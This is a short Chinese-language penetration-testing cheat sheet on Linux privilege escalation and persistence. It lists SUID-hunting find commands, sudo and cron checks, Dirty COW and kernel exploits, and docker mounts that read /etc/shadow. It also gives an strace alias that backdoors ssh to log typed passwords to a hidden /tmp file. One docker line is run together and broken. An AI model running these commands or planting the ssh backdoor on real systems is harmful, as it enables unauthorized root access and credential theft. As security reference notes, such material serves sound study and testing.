持久化 - Linux
========================================

权限提升
----------------------------------------
- 明文root密码/密码复用
- 脏牛漏洞本地提权
- 内核漏洞利用
    - searchspolit linux
    - searchspolit centos 7 kernel 3.10
- 攻击有root权限的服务
- 通过有SUID属性的可执行文件
    - 查找可能提权的可执行文件
    - ``find / -perm +4000 -ls``
    - ``find / -perm -u=s -type f 2>/dev/null``
    - ``find / -user root -perm -4000 -print 2>/dev/null``
    - ``find / -user root -perm -4000 -exec ls -ldb {} \;``
    - 常用的提权文件：Nmap，Vim，find，Bash，More，Less，Nano，cp
- 利用可用的root权限
    - ``sudo -l``
- crontab计划任务
- docker提权
    - 借助任意一个docker镜像创建一个容器(docker images)
	- docker pull alpine
    - docker run -it --rm xxx /bin/bash    #常规使用
    - docker run -it --rm -v /etc:/etc xxx /bin/bash    #异常使用- 
    - 挂载根目录到docker镜像内：docker run -v /:/mnt  -it alpine
    - 挂载/etc/目录：docker run -v /etc/:/mnt -it alpinecd /mntcat shadow
    
- 其它
    - ``https://github.com/SecWiki/linux-kernel-exploits``

后门
----------------------------------------
- strace 后门
    - ``alias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh'``
